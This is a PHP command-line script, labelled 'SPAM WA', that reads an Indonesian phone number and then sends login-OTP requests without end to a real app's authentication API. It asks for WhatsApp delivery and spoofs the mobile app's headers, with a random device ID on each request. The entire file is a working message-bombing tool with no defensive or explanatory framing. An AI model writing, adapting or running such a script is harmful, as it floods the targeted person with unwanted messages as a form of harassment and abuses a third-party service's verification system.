<?php
error_reporting(0);
function curl($url,$data_post=0,$header=array(),$proxy=0){
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1  ); 
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1  );
 curl_setopt($ch, CURLOPT_TIMEOUT,30         );
 curl_setopt($ch, CURLOPT_VERBOSE, 0         );
if($header){
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);}
if($data_post){ // POST METHOD
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
 curl_setopt($ch, CURLOPT_POSTFIELDS, $data_post);}
if($proxy){ // settings proxy
 curl_setopt($ch, CURLOPT_PROXY, $proxy); }
 $result = curl_exec($ch);
 $info   = curl_getinfo($ch);
 curl_close($ch);
 if($info["http_code"]==302){
 return $info["redirect_url"]; } else { return $result;}}
 function ua(){
   $ua[]="Accept: application/json";
   $ua[]="X-APP-VERSION-NAME: 3.3.1";
   $ua[]="X-APP-VERSION-CODE: 3311";
   $ua[]="Content-Type: application/json; charset=UTF-8";
   $ua[]="User-Agent: okhttp/4.8.1";
   return $ua;
 }
function gen_uuid() { 
return sprintf( '%04x%04x-%04x-%04x-%04x-%04x%04x%04x', mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0x0fff ) | 0x4000, mt_rand( 0, 0x3fff ) | 0x8000, mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ) ); 
}
function wa($no){
  $url="https://api.bukuwarung.com/api/v1/auth/otp/send";
  $data=["action"=>"LOGIN_OTP","countryCode"=>"62","deviceId"=>gen_uuid(),"method"=>"WA","phone"=>$no];
  $json=json_encode($data);
  return json_decode(curl($url,$json,ua()),1);
  }
system("clear");
print "\e[1;32m=============================================\n";
print "\e[1;32m|                   \e[1;35mSPAM WA                \e[1;32m|\n";
print "\e[1;32m|                \e[1;36m BY KAKATOJI              \e[1;32m|\n";
print "\e[1;32m=============================================\n";
$no=readline("\e[1;37m[>]No Wa 62: ");

while(true){
$bom=wa($no);
echo "[>] \e[1;35m".substr_replace($bom["recipient"],"*****",4,-3)." \e[1;31m|| \e[1;36m".$bom["message"]."\e[0m\n";
}
